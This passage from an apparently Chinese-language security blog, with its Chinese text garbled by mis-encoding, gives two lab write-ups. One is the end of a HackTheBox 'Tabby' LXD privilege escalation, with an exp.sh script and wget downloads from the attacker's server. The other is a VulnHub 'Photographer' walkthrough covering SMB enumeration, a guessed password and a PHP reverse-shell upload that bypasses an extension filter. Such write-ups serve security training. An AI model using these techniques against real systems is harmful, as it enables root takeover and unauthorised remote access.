å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">Downloading apk-tools-static-2.10.5-r1.apk</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: æˆåŠŸ</span><br><span class="line">Verified OK</span><br><span class="line">Selecting mirror http://dl-3.alpinelinux.org/alpine/v3.12/main</span><br><span class="line">fetch http://dl-3.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz</span><br><span class="line">(1/19) Installing musl (1.1.24-r9)</span><br><span class="line">(2/19) Installing busybox (1.31.1-r19)</span><br><span class="line">Executing busybox-1.31.1-r19.post-install</span><br><span class="line">(3/19) Installing alpine-baselayout (3.2.0-r7)</span><br><span class="line">Executing alpine-baselayout-3.2.0-r7.pre-install</span><br><span class="line">Executing alpine-baselayout-3.2.0-r7.post-install</span><br><span class="line">(4/19) Installing openrc (0.42.1-r11)</span><br><span class="line">Executing openrc-0.42.1-r11.post-install</span><br><span class="line">(5/19) Installing alpine-conf (3.9.0-r1)</span><br><span class="line">(6/19) Installing libcrypto1.1 (1.1.1g-r0)</span><br><span class="line">(7/19) Installing libssl1.1 (1.1.1g-r0)</span><br><span class="line">(8/19) Installing ca-certificates-bundle (20191127-r4)</span><br><span class="line">(9/19) Installing libtls-standalone (2.9.1-r1)</span><br><span class="line">(10/19) Installing ssl_client (1.31.1-r19)</span><br><span class="line">(11/19) Installing zlib (1.2.11-r3)</span><br><span class="line">(12/19) Installing apk-tools (2.10.5-r1)</span><br><span class="line">(13/19) Installing busybox-suid (1.31.1-r19)</span><br><span class="line">(14/19) Installing busybox-initscripts (3.2-r2)</span><br><span class="line">Executing busybox-initscripts-3.2-r2.post-install</span><br><span class="line">(15/19) Installing scanelf (1.2.6-r0)</span><br><span class="line">(16/19) Installing musl-utils (1.1.24-r9)</span><br><span class="line">(17/19) Installing libc-utils (0.7.2-r3)</span><br><span class="line">(18/19) Installing alpine-keys (2.2-r0)</span><br><span class="line">(19/19) Installing alpine-base (3.12.0-r0)</span><br><span class="line">Executing busybox-1.31.1-r19.trigger</span><br><span class="line">OK: 8 MiB <span class="keyword">in</span> 19 packages</span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment">#</span></span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">alpine-v3.12-x86_64-20200909_1548.tar.gz  build-alpine  LICENSE  README.md</span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>ä¸Šä¼ </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ash@tabby:/tmp$ wget http://10.10.17.216/exp.sh</span><br><span class="line">--2020-09-10 01:35:29--  http://10.10.17.216/exp.sh</span><br><span class="line">Connecting to 10.10.17.216:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 582 [text/x-sh]</span><br><span class="line">Saving to: â€˜exp.shâ€™</span><br><span class="line"></span><br><span class="line">exp.sh              100%[===================&gt;]     582  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-09-10 01:35:30 (72.2 MB/s) - â€˜exp.shâ€™ saved [582/582]</span><br><span class="line"></span><br><span class="line">&lt;.10.17.216/alpine-v3.12-x86_64-20200909_1548.tar.gz</span><br><span class="line">--2020-09-10 01:38:02--  http://10.10.17.216/alpine-v3.12-x86_64-20200909_1548.tar.gz</span><br><span class="line">Connecting to 10.10.17.216:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3201921 (3.1M) [application/gzip]</span><br><span class="line">Saving to: â€˜alpine-v3.12-x86_64-20200909_1548.tar.gzâ€™</span><br><span class="line"></span><br><span class="line">alpine-v3.12-x86_64 100%[===================&gt;]   3.05M   665KB/s    <span class="keyword">in</span> 9.5s    </span><br><span class="line"></span><br><span class="line">2020-09-10 01:38:12 (328 KB/s) - â€˜alpine-v3.12-x86_64-20200909_1548.tar.gzâ€™ saved [3201921/3201921]</span><br><span class="line"></span><br><span class="line">ash@tabby:/tmp$ ls</span><br><span class="line">alpine-v3.12-x86_64-20200909_1548.tar.gz   hsperfdata_tomcat</span><br><span class="line">ash@tabby:/tmp$</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.194 - - [09/Sep/2020 20:42:27] <span class="string">&quot;GET /alpine-v3.12-x86_64-20200909_1548.tar.gz HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>æ„é€ shellè„šæœ¬</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># cat exp.sh </span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;--------------lxc image import---------------&quot;</span></span><br><span class="line">lxc image import ./alpine-v3.12-x86_64-20200909_1548.tar.gz --<span class="built_in">alias</span> fjy</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;--------------lxc image list-----------------&quot;</span></span><br><span class="line">lxc image list</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----------lxc container creating-------------&quot;</span></span><br><span class="line">lxd init</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;--------lxc security.privileged=true---------&quot;</span></span><br><span class="line">lxc init fjy fjy-tabby -c security.privileged=<span class="literal">true</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;------------lxc config device----------------&quot;</span></span><br><span class="line">lxc config device add fjy-tabby mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;--------------lxc starting-------------------&quot;</span></span><br><span class="line">lxc start fjy-tabby</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>ä¸Šä¼ </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ash@tabby:/tmp$ wget http://10.10.17.216/exp.sh</span><br><span class="line">--2020-09-10 01:35:29--  http://10.10.17.216/exp.sh</span><br><span class="line">Connecting to 10.10.17.216:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 582 [text/x-sh]</span><br><span class="line">Saving to: â€˜exp.shâ€™</span><br><span class="line"></span><br><span class="line">exp.sh              100%[===================&gt;]     582  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-09-10 01:35:30 (72.2 MB/s) - â€˜exp.shâ€™ saved [582/582]</span><br><span class="line"></span><br><span class="line">ash@tabby:/tmp$</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.194 - - [09/Sep/2020 21:06:20] <span class="string">&quot;GET /exp.sh HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>æ‰§è¡Œ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ash@tabby:~/tmp$ ls</span><br><span class="line">alpine-v3.12-x86_64-20200910_2121.tar.gz  exp.sh</span><br><span class="line">ash@tabby:~/tmp$ ./exp.sh </span><br><span class="line">--------------lxc image import---------------</span><br><span class="line">--------------lxc image list-----------------</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">| fjy   | 24645e832789 | no     | alpine v3.12 (20200910_21:21) | x86_64       | CONTAINER | 3.05MB | Sep 11, 2020 at 2:31am (UTC) |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">----------lxc container creating-------------</span><br><span class="line">Would you like to use LXD clustering? (yes/no) [default=no]: yes</span><br><span class="line">What name should be used to identify this node <span class="keyword">in</span> the cluster? [default=tabby]: </span><br><span class="line">What IP address or DNS name should be used to reach this node? [default=10.10.10.194]: </span><br><span class="line">Are you joining an existing cluster? (yes/no) [default=no]: </span><br><span class="line">Setup password authentication on the cluster? (yes/no) [default=yes]: </span><br><span class="line">Trust password <span class="keyword">for</span> new clients: </span><br><span class="line">Again: </span><br><span class="line">Do you want to configure a new <span class="built_in">local</span> storage pool? (yes/no) [default=yes]: </span><br><span class="line">Name of the storage backend to use (zfs, btrfs, dir, lvm) [default=zfs]: </span><br><span class="line">Create a new ZFS pool? (yes/no) [default=yes]: </span><br><span class="line">Would you like to use an existing block device? (yes/no) [default=no]: </span><br><span class="line">Size <span class="keyword">in</span> GB of the new loop device (1GB minimum) [default=15GB]: </span><br><span class="line">Do you want to configure a new remote storage pool? (yes/no) [default=no]: </span><br><span class="line">Would you like to connect to a MAAS server? (yes/no) [default=no]: </span><br><span class="line">Would you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: </span><br><span class="line">Would you like to create a new Fan overlay network? (yes/no) [default=yes]: </span><br><span class="line">What subnet should be used as the Fan underlay? [default=auto]: </span><br><span class="line">Would you like stale cached images to be updated automatically? (yes/no) [default=yes] </span><br><span class="line">Would you like a YAML <span class="string">&quot;lxd init&quot;</span> preseed to be printed? (yes/no) [default=no]: </span><br><span class="line">--------lxc security.privileged=<span class="literal">true</span>---------</span><br><span class="line">Creating fjy-tabby</span><br><span class="line">------------lxc config device----------------</span><br><span class="line">Device mydevice added to fjy-tabby</span><br><span class="line">--------------lxc starting-------------------</span><br><span class="line">ash@tabby:~/tmp$ lxc <span class="built_in">exec</span> fjy-tabby /bin/sh</span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">~ <span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">~ <span class="comment"># cd /mnt/root/</span></span><br><span class="line">/mnt/root <span class="comment"># ls</span></span><br><span class="line">bin         home        lost+found  root        swap.img</span><br><span class="line">boot        lib         media       run         sys</span><br><span class="line">cdrom       lib32       mnt         sbin        tmp</span><br><span class="line">dev         lib64       opt         snap        usr</span><br><span class="line">etc         libx32      proc        srv         var</span><br><span class="line">/mnt/root <span class="comment"># cd root/</span></span><br><span class="line">/mnt/root/root <span class="comment"># ls</span></span><br><span class="line">root.txt  snap</span><br><span class="line">/mnt/root/root <span class="comment"># cat root.txt </span></span><br><span class="line">*************************</span><br><span class="line">/mnt/root/root <span class="comment">#</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Photographer</title>
    <url>/2020/12/18/Photographer/</url>
    <content><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote>
<p>This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-ä¿¡æ¯æ”¶é›†ï¼Œä¸Šnmap"><a href="#0x01-ä¿¡æ¯æ”¶é›†ï¼Œä¸Šnmap" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†ï¼Œä¸Šnmap"></a>0x01.ä¿¡æ¯æ”¶é›†ï¼Œä¸Šnmap</h2><p><code>å¯ä»¥å‘ç°å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ254ä¸ºç‰©ç†æœºï¼Œ129ä¸ºkaliï¼Œé‚£ä¹ˆ135å°±æ˜¯ç›®æ ‡</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/photographer# nmap -sP 192.168.1.0/24 -oN nmap.sP</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-18 06:13 EST</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.135</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">MAC Address: 00:0C:29:2D:43:1A (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.254</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 00:50:56:EB:EE:5F (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.129</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 27.96 seconds</span><br><span class="line">root@JIYE:~/vulnhub/photographer#</span><br></pre></td></tr></table></figure>

<h2 id="0x02-æ‰«æç«¯å£"><a href="#0x02-æ‰«æç«¯å£" class="headerlink" title="0x02.æ‰«æç«¯å£"></a>0x02.æ‰«æç«¯å£</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†80ã€139ã€8000ã€445(SMB)ç­‰æ•æ„Ÿç«¯å£</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/photographer# nmap -sC -sV -sT 192.168.1.135 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-18 06:23 EST</span><br><span class="line">Nmap scan report for 192.168.1.135</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Photographer by v1n1v131r4</span><br><span class="line">139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">8000/tcp open  ssl/http-alt Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-generator: Koken 0.22.24</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: daisa ahomi</span><br><span class="line">MAC Address: 00:0C:29:2D:43:1A (VMware)</span><br><span class="line">Service Info: Host: PHOTOGRAPHER</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 9h40m00s, deviation: 2h53m12s, median: 7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: photographer</span><br><span class="line">|   NetBIOS computer name: PHOTOGRAPHER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: photographer</span><br><span class="line">|_  System time: 2020-12-18T14:23:58-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-12-18T19:23:57</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 55.84 seconds</span><br><span class="line">root@JIYE:~/vulnhub/photographer#</span><br></pre></td></tr></table></figure>

<h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œæ˜¯ä¸€ä¸ªé™æ€ç•Œé¢ï¼Œæ²¡æœ‰ä»€ä¹ˆå‘ç°</code></p>
<img src="/2020/12/18/Photographer/image-20201218192822059.png" class>

<h2 id="0x04-è®¿é—®8000ç«¯å£"><a href="#0x04-è®¿é—®8000ç«¯å£" class="headerlink" title="0x04.è®¿é—®8000ç«¯å£"></a>0x04.è®¿é—®8000ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°CMSä¸ºKokenï¼Œå¹¶ä¸”å‘ç°ä¸€ä¸ªshell.phpä¸çŸ¥é“è‚è‚¾çš„ã€‚</code></p>
<img src="/2020/12/18/Photographer/image-20201218193224511.png" class>

<p><code>æŸ¥çœ‹æºç ï¼Œå‘ç°CMSç‰ˆæœ¬ä¸º0.22.24</code></p>
<img src="/2020/12/18/Photographer/image-20201218193326700.png" class>

<h2 id="0x05-Google-exploit"><a href="#0x05-Google-exploit" class="headerlink" title="0x05.Google exploit"></a>0x05.Google exploit</h2><p><code>æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œemmmmmm.åˆšæ‰çˆ¬è™«çš„é¡µé¢æ²¡æœ‰ä¸Šä¼ ç‚¹ï¼Œæ‰€ä»¥çŒœæµ‹éœ€è¦ç™»å…¥åˆ°åå°è¿›è¡Œä¸Šä¼ ã€‚</code></p>
<img src="/2020/12/18/Photographer/image-20201218193515066.png" class>

<h2 id="0x06-è®¿é—®adminç›®å½•ï¼ˆğŸ™ƒç«Ÿç„¶æˆåŠŸäº†ï¼‰"><a href="#0x06-è®¿é—®adminç›®å½•ï¼ˆğŸ™ƒç«Ÿç„¶æˆåŠŸäº†ï¼‰" class="headerlink" title="0x06.è®¿é—®adminç›®å½•ï¼ˆğŸ™ƒç«Ÿç„¶æˆåŠŸäº†ï¼‰"></a>0x06.è®¿é—®adminç›®å½•ï¼ˆğŸ™ƒç«Ÿç„¶æˆåŠŸäº†ï¼‰</h2><p><code>è¿™é‡Œå…¶å®éœ€è¦æ‰«ä¸€ä¸‹ç›®å½•ï¼Œä½†æ˜¯çŒœåˆ°äº†adminï¼Œå°±ä¸èµ˜è¿°äº†ğŸŒšã€‚</code></p>
<img src="/2020/12/18/Photographer/image-20201218193934550.png" class>

<p><code>å°è¯•å¼±å£ä»¤ç™»å…¥ï¼Œå¯ä»¥çœ‹åˆ°ç”¨æˆ·åéœ€è¦æ˜¯ä¸€ä¸ªé‚®ç®±ï¼Œä½†ä¸æ˜¯çŸ¥é“æ ¼å¼ï¼Œæ•…æ— æ³•è¿›è¡Œçˆ†ç ´ã€‚</code></p>
<img src="/2020/12/18/Photographer/image-20201218194227961.png" class>

<h2 id="0x07-å®¡æŸ¥445ç«¯å£"><a href="#0x07-å®¡æŸ¥445ç«¯å£" class="headerlink" title="0x07.å®¡æŸ¥445ç«¯å£"></a>0x07.å®¡æŸ¥445ç«¯å£</h2><p><code>å‰é¢å‘ç°äº†å¼€æ”¾äº†445ç«¯å£ï¼Œæ‰€ä»¥ä½¿ç”¨enum4linuxå¼€å§‹æ¢ç´¢ä¸€ä¸‹</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# enum4linux -a -o 192.168.1.135</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Dec 18 06:45:16 2020</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.1.135</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... &#x27;&#x27;</span><br><span class="line">Password ......... &#x27;&#x27;</span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.1.135    |</span><br><span class="line"> ===================================================== </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> ============================================= </span><br><span class="line">|    Nbtstat Information for 192.168.1.135    |</span><br><span class="line"> ============================================= </span><br><span class="line">Looking up status of 192.168.1.135</span><br><span class="line">        PHOTOGRAPHER    &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        PHOTOGRAPHER    &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        PHOTOGRAPHER    &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ====================================== </span><br><span class="line">|    Session Check on 192.168.1.135    |</span><br><span class="line"> ====================================== </span><br><span class="line">[+] Server 192.168.1.135 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"> ============================================ </span><br><span class="line">|    Getting domain SID for 192.168.1.135    |</span><br><span class="line"> ============================================ </span><br><span class="line">Domain Name: WORKGROUP</span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line">[+] Can&#x27;t determine if host is part of domain or part of a workgroup</span><br><span class="line"></span><br><span class="line"> ======================================= </span><br><span class="line">|    OS information on 192.168.1.135    |</span><br><span class="line"> ======================================= </span><br><span class="line">Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.</span><br><span class="line">[+] Got OS info for 192.168.1.135 from smbclient: </span><br><span class="line">[+] Got OS info for 192.168.1.135 from srvinfo:</span><br><span class="line">        PHOTOGRAPHER   Wk Sv PrQ Unx NT SNT photographer server (Samba, Ubuntu)</span><br><span class="line">        platform_id     :       500</span><br><span class="line">        os version      :       6.1</span><br><span class="line">        server type     :       0x809a03</span><br><span class="line"></span><br><span class="line"> ============================== </span><br><span class="line">|    Users on 192.168.1.135    |</span><br><span class="line"> ============================== </span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 874.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 888.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.</span><br><span class="line"></span><br><span class="line"> ========================================== </span><br><span class="line">|    Share Enumeration on 192.168.1.135    |</span><br><span class="line"> ========================================== </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        sambashare      Disk      Samba on Ubuntu</span><br><span class="line">        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line"></span><br><span class="line">[+] Attempting to map shares on 192.168.1.135</span><br><span class="line">//192.168.1.135/print$  Mapping: DENIED, Listing: N/A</span><br><span class="line">//192.168.1.135/sambashare      Mapping: OK, Listing: OK</span><br><span class="line">//192.168.1.135/IPC$    [E] Can&#x27;t understand response:</span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="line"></span><br><span class="line"> ===================================================== </span><br><span class="line">|    Password Policy Information for 192.168.1.135    |</span><br><span class="line"> ===================================================== </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">..........(çœç•¥éƒ¨åˆ†æ— å…³ç´§è¦çš„å†…å®¹)</span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Getting printer info for 192.168.1.135    |</span><br><span class="line"> ============================================== </span><br><span class="line">No printers returned.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum4linux complete on Fri Dec 18 06:45:30 2020</span><br><span class="line"></span><br><span class="line">root@JIYE:~#</span><br></pre></td></tr></table></figure>

<p><code>å¯ä»¥å‘ç°sambaæœåŠ¡çš„ä¸€ä¸ªç›®å½•sambashare</code></p>
<blockquote>
<p>//192.168.1.135/sambashare      Mapping: OK, Listing: OK</p>
</blockquote>
<p><code>åŒ¿åç›´æ¥è¿æ¥è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°ä¸€ä¸ªwordpressç«™ç‚¹çš„å¤‡ä»½æ–‡ä»¶å’Œä¸€ä¸ªtxtæ–‡ä»¶</code></p>
<img src="/2020/12/18/Photographer/image-20201218195708592.png" class>

<p><code>æ ¹æ®æ–‡ä»¶åmailsent.txtæ–‡ä»¶æ˜¯ä¸€å°å‘é€çš„é‚®ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;</span><br><span class="line">Date: Mon, 20 Jul 2020 11:40:36 -0400</span><br><span class="line">From: Agi Clarence &lt;agi@photographer.com&gt;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0</span><br><span class="line">X-Accept-Language: en-us, en</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">To: Daisa Ahomi &lt;daisa@photographer.com&gt;</span><br><span class="line">Subject: To Do - Daisa Website&#x27;s</span><br><span class="line">Content-Type: text/plain; charset=us-ascii; format=flowed</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line"></span><br><span class="line">Hi Daisa!</span><br><span class="line">Your site is ready now.</span><br><span class="line">Don&#x27;t forget your secret, my babygirl ;)</span><br></pre></td></tr></table></figure>

<p><code>å¯ä»¥çœ‹åˆ°é‚®ç®±ä¸ºdaisa@photographer.com</code></p>
<p><code>è¿˜æœ‰é‚®ä»¶å†…å®¹ä¸ºä½ çš„ç½‘ç«™ç°åœ¨å‡†å¤‡å¥½äº†ï¼Œä¸è¦å¿˜è®°ä½ çš„å¯†ç my babygirl</code></p>
<p><code>è¿™é‡Œæ¨æµ‹å¯†ç ä¸ºbabygirlï¼Œæ‰€ä»¥å°è¯•ç™»å…¥ï¼ŒOKæ¨æµ‹æ­£ç¡®</code></p>
<img src="/2020/12/18/Photographer/image-20201218200838692.png" class>

<h2 id="0x08-ä¸Šä¼ æ–‡ä»¶ï¼Œåå¼¹shell"><a href="#0x08-ä¸Šä¼ æ–‡ä»¶ï¼Œåå¼¹shell" class="headerlink" title="0x08.ä¸Šä¼ æ–‡ä»¶ï¼Œåå¼¹shell"></a>0x08.ä¸Šä¼ æ–‡ä»¶ï¼Œåå¼¹shell</h2><p><code>æœ¬æ¬¡ä½¿ç”¨kaliè‡ªå¸¦reverse shellè·¯å¾„(/usr/share/webshells/php/php-reverse-shell.php)</code></p>
<p><code>å°†IPä¿®æ”¹ä¸ºkaliæœ¬èº«ï¼Œç«¯å£ä¸º6666</code></p>
<img src="/2020/12/18/Photographer/image-20201218201703596.png" class>

<p><code>ä¸Šä¼ </code></p>
<img src="/2020/12/18/Photographer/image-20201218202118418.png" class>

<p><code>ç»“æœä»…ä»…å¯ä»¥ä¸Šä¼ JPGã€PNGã€GIFã€MP4æ ¼å¼æ–‡ä»¶ï¼Œæ‰€ä»¥å…ˆä¿®æ”¹æ–‡ä»¶åç¼€</code></p>
<img src="/2020/12/18/Photographer/image-20201218202345783.png" class>

<p><code>è¿›è¡Œä¸Šä¼ </code></p>
<img src="/2020/12/18/Photographer/image-20201218202606655.png" class>

<p><code>æŠ“åŒ…å°†åç¼€æ”¹å›php</code></p>
<img src="/2020/12/18/Photographer/image-20201218203003281.png" class>

<p><code>kaliç›‘å¬</code></p>
